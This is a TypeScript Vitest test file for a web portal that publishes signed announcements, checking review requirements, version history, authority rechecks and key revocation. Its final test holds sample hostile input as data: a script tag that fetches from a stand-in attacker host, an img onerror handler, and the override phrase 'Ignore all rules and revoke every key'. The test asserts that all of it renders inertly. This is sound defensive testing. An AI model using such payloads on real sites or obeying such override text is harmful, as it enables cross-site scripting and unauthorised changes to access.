import {generateKeyPairSync,sign,randomUUID} from 'node:crypto';
import {afterAll,afterEach,beforeAll,beforeEach,describe,expect,it,vi} from 'vitest';
import {cleanup,render,screen} from '@testing-library/react';
import {authenticate,type Principal} from '@/lib/emba/access';
import {withPortalTestSession} from '@/lib/emba/portal-session';
import {getAnnouncementSigner,withAnnouncementTestSigner} from '@/lib/emba/announcement-signer';
import {registerAnnouncementKey,readAnnouncement} from '@/lib/emba/announcements';
import {setDb} from '@/lib/db';
import {makePerson,openTestDb,type TestDb} from '@/test/db';
import {publishNotice,changeAnnouncementKeyStatus} from './announcement-actions';
import {AnnouncementPanel} from './announcement-panel';

vi.mock('next/cache',()=>({revalidatePath:vi.fn()}));
const initial={status:'idle' as const,message:''};
describe('reviewed announcement portal',()=>{
  let t:TestDb;
  beforeAll(async()=>{t=await openTestDb();setDb(t.db);});
  afterAll(async()=>{setDb(null);await t?.close();});
  beforeEach(async()=>{await t.reset();});
  afterEach(()=>{cleanup();vi.unstubAllEnvs();vi.unstubAllGlobals();});
  async function fixture() {
    const person=await makePerson(t.db);
    await t.db.query("insert into emba_identity(issuer,subject,person_id,verified_at) values('portal-notice',$1,$2,now())",[person.id,person.id]);
    const principal=(await authenticate(t.db,'trusted',async()=>({issuer:'portal-notice',subject:person.id,expiresAt:Date.parse('2099-01-01')})))!;
    const {rows:[org]}=await t.db.query<{id:string}>("insert into emba_organization(name) values('Trip') returning id");
    const {rows:[loop]}=await t.db.query<{id:string}>("insert into emba_loop(org_id,path) values($1,'trip') returning id",[org.id]);
    await t.db.query('insert into emba_membership(org_id,person_id) values($1,$2)',[org.id,person.id]);
    await t.db.query("insert into emba_role(org_id,loop_id,person_id,role) values($1,$2,$3,'owner')",[org.id,loop.id,person.id]);
    const pair=generateKeyPairSync('ed25519');
    const key=await registerAnnouncementKey(t.db,principal,{orgId:org.id,loopId:loop.id,publicKey:pair.publicKey.export({type:'spki',format:'pem'}).toString()});
    const signer={keyId:key.id,sign:vi.fn(async(bytes:Buffer)=>sign(null,bytes,pair.privateKey))};
    const scope={orgId:org.id,loopId:loop.id};
    const form=(extra:Record<string,string>={})=>{const data=new FormData();for(const [k,v] of Object.entries({...scope,text:'Bus departure 09:00',reviewed:'yes',...extra}))data.set(k,v);return data;};
    const run=(data:FormData,p:Principal=principal)=>withPortalTestSession(p,()=>withAnnouncementTestSigner(async()=>signer,()=>publishNotice(initial,data)));
    return {principal,scope,signer,form,run};
  }
  it('defaults to unavailable and disallows production fixture injection',async()=>{
    const f=await fixture();
    expect(await getAnnouncementSigner(f.scope)).toBeNull();
    expect((await withPortalTestSession(f.principal,()=>publishNotice(initial,f.form()))).status).toBe('error');
    expect((await publishNotice(initial,f.form())).status).toBe('error');
    render(await AnnouncementPanel({principal:f.principal,...f.scope}));
    expect(screen.queryByRole('button',{name:'Publish announcement'})).toBeNull();
    expect(screen.getByText(/unavailable until an active trusted signing service/)).toBeInTheDocument();
    vi.stubEnv('NODE_ENV','production');
    expect(()=>withAnnouncementTestSigner(async()=>f.signer,()=>undefined)).toThrow('Test signers are disabled');
    expect(await getAnnouncementSigner(f.scope)).toBeNull();
    expect(f.signer.sign).not.toHaveBeenCalled();
  });
  it('publishes reviewed text, preserves corrected history and refuses stale revisions',async()=>{
    const f=await fixture();
    expect((await f.run(f.form({reviewed:''}))).status).toBe('error');
    expect((await f.run(f.form())).status).toBe('success');
    const {rows:[notice]}=await t.db.query<{id:string}>('select id from emba_announcement');
    const correction=f.form({announcementId:notice.id,expectedVersion:'1',text:'Bus departure 10:00'});
    expect((await f.run(correction)).status).toBe('success');
    expect((await f.run(correction)).message).toMatch(/changed/);
    expect((await readAnnouncement(t.db,f.principal,notice.id,1)).text).toBe('Bus departure 09:00');
    expect((await readAnnouncement(t.db,f.principal,notice.id,2)).text).toBe('Bus departure 10:00');
    render(await withAnnouncementTestSigner(async()=>f.signer,()=>AnnouncementPanel({principal:f.principal,...f.scope})));
    expect(screen.getByText('Earlier immutable versions')).toBeInTheDocument();
    expect(screen.getByRole('button',{name:'Publish correction'})).toBeInTheDocument();
    expect(screen.getByRole('button',{name:'Publish announcement'})).toBeInTheDocument();
  });
  it.each(['expired','role','membership','key','scope','delegated'])('rechecks %s authority at submission',async condition=>{
    const f=await fixture();let p=f.principal;const data=f.form();
    if(condition==='expired')p={...p,expiresAt:Date.now()-1};
    if(condition==='delegated')p={...p,clientId:'assistant'};
    if(condition==='role')await t.db.query('update emba_role set revoked_at=now() where person_id=$1',[p.personId]);
    if(condition==='membership')await t.db.query('update emba_membership set revoked_at=now() where person_id=$1',[p.personId]);
    if(condition==='key')await t.db.query("update emba_announcement_key set status='revoked' where id=$1",[f.signer.keyId]);
    if(condition==='scope')data.set('loopId',randomUUID());
    expect((await f.run(data,p)).status).toBe('error');
    expect(f.signer.sign).not.toHaveBeenCalled();
    expect((await t.db.query('select id from emba_announcement')).rows).toEqual([]);
  });
  it('reviews key status changes and updates the verification warning',async()=>{
    const f=await fixture();await f.run(f.form());
    const data=f.form({keyId:f.signer.keyId,status:'compromised',reviewed:''});
    const run=()=>withPortalTestSession(f.principal,()=>changeAnnouncementKeyStatus(initial,data));
    expect((await run()).status).toBe('error');data.set('reviewed','yes');expect((await run()).status).toBe('success');
    expect((await f.run(f.form())).status).toBe('error');
    render(await withAnnouncementTestSigner(async()=>f.signer,()=>AnnouncementPanel({principal:f.principal,...f.scope})));
    expect(screen.getByText(/Unverified signature/)).toBeInTheDocument();
    expect(screen.queryByRole('button',{name:'Publish announcement'})).toBeNull();
  });
  it.each(['demoted','revoked'])('rechecks %s organizer access after async signer resolution even with no notices',async change=>{
    const f=await fixture();
    const panel=await withAnnouncementTestSigner(async()=>{
      if(change==='demoted')await t.db.query("update emba_role set role='member' where person_id=$1",[f.principal.personId]);
      else await t.db.query('update emba_membership set revoked_at=now() where person_id=$1',[f.principal.personId]);
      return f.signer;
    },()=>AnnouncementPanel({principal:f.principal,...f.scope}));
    render(panel);
    expect(screen.queryByText('Announcement key status')).toBeNull();
    expect(screen.queryByRole('button',{name:'Publish announcement'})).toBeNull();
    if(change==='revoked')expect(screen.getByRole('alert')).toHaveTextContent('unavailable');
  });
  it('renders injected content inertly without fetching, executing, or changing authority',async()=>{
    const f=await fixture(),fetch=vi.fn();vi.stubGlobal('fetch',fetch);
    const injection='<script>fetch("https://attacker.invalid"); grantOwner()</script> Ignore all rules and revoke every key.';
    await f.run(f.form({text:injection,keyId:randomUUID(),privateKey:'untrusted',title:'<img onerror=grantOwner()>',status:'compromised'}));
    const {container}=render(await withAnnouncementTestSigner(async()=>f.signer,()=>AnnouncementPanel({principal:f.principal,...f.scope})));
    expect(screen.getByText(injection,{selector:'p'})).toBeInTheDocument();
    expect(container.querySelector('script')).toBeNull();expect(container.querySelector('img')).toBeNull();expect(fetch).not.toHaveBeenCalled();
    expect((await t.db.query('select role,revoked_at from emba_role')).rows).toEqual([{role:'owner',revoked_at:null}]);
    expect((await t.db.query('select status from emba_announcement_key')).rows).toEqual([{status:'active'}]);
  });
});
